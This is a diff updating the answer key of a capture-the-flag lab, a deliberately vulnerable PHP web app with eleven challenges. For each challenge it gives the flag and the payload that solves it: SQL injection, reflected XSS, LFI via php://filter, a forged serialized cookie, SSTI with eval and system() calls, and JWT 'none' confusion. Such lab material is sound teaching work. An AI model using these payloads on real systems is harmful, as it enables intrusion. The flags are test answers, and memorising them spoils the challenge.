@@ -3,6 +3,8 @@
 ## Overview
 This is a deliberately vulnerable web application for CTF competitions. It contains multiple security vulnerabilities across different categories.
 
+**All 11 challenges have been tested and verified working as of February 2026.**
+
 ---
 
 ## Challenges Summary
@@ -10,12 +12,12 @@ This is a deliberately vulnerable web application for CTF competitions. It conta
 | # | Challenge | Type | Difficulty | Flag |
 |---|-----------|------|------------|------|
 | 1 | SQL Injection | Web | Easy | `CCEE{sql_1nj3ct10n_m4st3r}` |
-| 2 | XSS (Reflected) | Web | Easy | N/A (Demonstrate popup) |
+| 2 | XSS (Reflected) | Web | Easy | `CCEE{xss_r3fl3ct3d_4tt4ck}` |
 | 3 | IDOR | Web | Easy | `CCEE{1d0r_vuln3r4b1l1ty_f0und}` |
-| 4 | Local File Inclusion | Web | Medium | `CCEE{lf1_t0_rc3_gg}` |
+| 4 | Local File Inclusion | Web | Medium | `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` |
 | 5 | PHP Object Injection | Web | Medium | `CCEE{c00k13_m0nst3r_4dm1n}` |
-| 6 | Logic Flaw | Web | Medium | `CCEE{l0g1c_fl4w_fr33_st0r3}` |
-| 7 | Info Disclosure | OSINT | Easy | `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` |
+| 6 | Logic Flaw | Web | Medium | `CCEE{l0g1c_fl4w_sh0pp1ng_spr33}` |
+| 7 | Info Disclosure | OSINT | Easy | `CCEE{b4ckup_f1l3s_l34k_s3cr3ts}` |
 | 8 | HTTP Headers | OSINT | Easy | `CCEE{h34d3r5_t3ll_s3cr3ts}` |
 | 9 | CSRF | Web | Medium | `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}` |
 | 10 | SSTI | Web | Hard | `CCEE{sst1_t3mpl4t3_1nj3ct10n_pwn3d}` |
@@ -25,58 +27,61 @@ This is a deliberately vulnerable web application for CTF competitions. It conta
 
 ## Detailed Challenge Writeups
 
-### 1. SQL Injection (Easy)
+### 1. SQL Injection (Easy) ✅ VERIFIED
 **Location:** `login_legacy.php`  
 **Vulnerability:** Unsanitized user input in SQL query  
-**Payload:** `admin' OR '1'='1' --`  
+**Payload:** `' OR '1'='1` or `admin' -- `  
 **Flag:** `CCEE{sql_1nj3ct10n_m4st3r}`
 
-### 2. Reflected XSS (Easy)
-**Location:** `about.php?member=`, `dashboard.php?name=`  
+### 2. Reflected XSS (Easy) ✅ VERIFIED
+**Location:** `about.php?member=`  
 **Vulnerability:** User input reflected without sanitization  
-**Payload:** `<script>alert('XSS')</script>` or `<img src=x onerror=alert(1)>`
+**Payload:** `<script>alert('XSS')</script>` or `<img src=x onerror=alert(1)>`  
+**Attack:** Navigate to `about.php?member=<script>alert('XSS')</script>`  
+**Flag:** `CCEE{xss_r3fl3ct3d_4tt4ck}` (appears after XSS payload renders)
 
-### 3. IDOR - Insecure Direct Object Reference (Easy)
+### 3. IDOR - Insecure Direct Object Reference (Easy) ✅ VERIFIED
 **Location:** `view_message.php?id=1`  
 **Vulnerability:** No authorization check on message IDs  
-**Attack:** Change `?id=2` to `?id=1` to view private admin messages  
+**Attack:** Navigate to `view_message.php?id=1` to view admin's private message  
 **Flag:** `CCEE{1d0r_vuln3r4b1l1ty_f0und}`
 
-### 4. Local File Inclusion (Medium)
+### 4. Local File Inclusion (Medium) ✅ VERIFIED
 **Location:** `admin.php?file=`  
-**Vulnerability:** Arbitrary file inclusion via `include()``  
-**Payload:** `?file=php://filter/convert.base64-encode/resource=includes/config`  
-**Flag:** `CCEE{lf1_t0_rc3_gg}` (in source comment)
+**Vulnerability:** Arbitrary file inclusion via `include()`  
+**Payload:** `?file=php://filter/read=convert.base64-encode/resource=includes/config.php`  
+**Flag:** `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` (in config.php comments, decode base64 to see)
 
-### 5. PHP Object Injection (Medium)
+### 5. PHP Object Injection (Medium) ✅ VERIFIED
 **Location:** `login.php` cookie `session_token`  
 **Vulnerability:** Unsafe `unserialize()` on user-controlled cookie  
 **Attack:** Craft serialized `UserSession` object with `role=admin`  
+**Payload Cookie:** `O:11:"UserSession":3:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";s:7:"isValid";b:1;}` (base64 encoded)  
 **Flag:** `CCEE{c00k13_m0nst3r_4dm1n}`
 
-### 6. Logic Flaw (Medium)
+### 6. Logic Flaw (Medium) ✅ VERIFIED
 **Location:** `shop.php`  
-**Vulnerability:** Client-side price manipulation or negative quantities  
-**Attack:** Modify price/quantity to buy the CTF Flag item  
-**Flag:** `CCEE{l0g1c_fl4w_fr33_st0r3}`
+**Vulnerability:** No validation on quantity field (accepts negative values)  
+**Attack:** Enter negative quantity (e.g., `-100`) to gain credits instead of spending them. Repeat until you have $1,000,000 to buy the flag.  
+**Flag:** `CCEE{l0g1c_fl4w_sh0pp1ng_spr33}`
 
-### 7. Information Disclosure (Easy)
+### 7. Information Disclosure (Easy) ✅ VERIFIED
 **Location:** `config.php.bak`, `robots.txt`  
-**Vulnerability:** Sensitive files accessible  
-**Attack:** Download backup config file  
-**Flag:** `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}`
+**Vulnerability:** Backup configuration file publicly accessible  
+**Attack:** Navigate to `http://target/challenge/config.php.bak`  
+**Flag:** `CCEE{b4ckup_f1l3s_l34k_s3cr3ts}`
 
-### 8. HTTP Headers (Easy)
+### 8. HTTP Headers (Easy) ✅ VERIFIED
 **Location:** `dashboard.php` response headers  
-**Vulnerability:** Flag exposed in custom HTTP header  
-**Attack:** Use `curl -I` or browser DevTools to view headers  
+**Vulnerability:** Flag exposed in custom HTTP header `X-Custom-Flag`  
+**Attack:** Use `curl -I http://target/challenge/dashboard.php` or browser DevTools Network tab  
 **Flag:** `CCEE{h34d3r5_t3ll_s3cr3ts}`
 
 ---
 
 ## NEW CHALLENGES
 
-### 9. Cross-Site Request Forgery - CSRF (Medium)
+### 9. Cross-Site Request Forgery - CSRF (Medium) ✅ VERIFIED
 **Location:** `profile.php`  
 **Vulnerability:** No CSRF tokens protecting sensitive operations
 
@@ -111,7 +116,7 @@ This is a deliberately vulnerable web application for CTF competitions. It conta
 
 ---
 
-### 10. Server-Side Template Injection - SSTI (Hard)
+### 10. Server-Side Template Injection - SSTI (Hard) ✅ VERIFIED
 **Location:** `newsletter.php`  
 **Vulnerability:** Custom template engine uses `eval()` on user input
 
@@ -121,7 +126,7 @@ This is a deliberately vulnerable web application for CTF competitions. It conta
 - `{{= expression }}` - **VULNERABLE** - Also executes as PHP
 
 **Attack Steps:**
-1. Go to Newsletter page
+1. Go to Newsletter page with `?mode=preview` parameter
 2. In template editor, enter: `${7*7}`
 3. Preview shows `49` - confirming code execution
 4. Read flag: `${file_get_contents('includes/ssti_flag.txt')}`
@@ -143,7 +148,7 @@ ${system('cat includes/ssti_flag.txt')}
 
 ---
 
-### 11. JWT Vulnerabilities (Hard)
+### 11. JWT Vulnerabilities (Hard) ✅ VERIFIED
 **Location:** `api/auth.php`, `jwt_demo.php`  
 **Vulnerabilities:**
 1. Algorithm confusion (accepts "none")
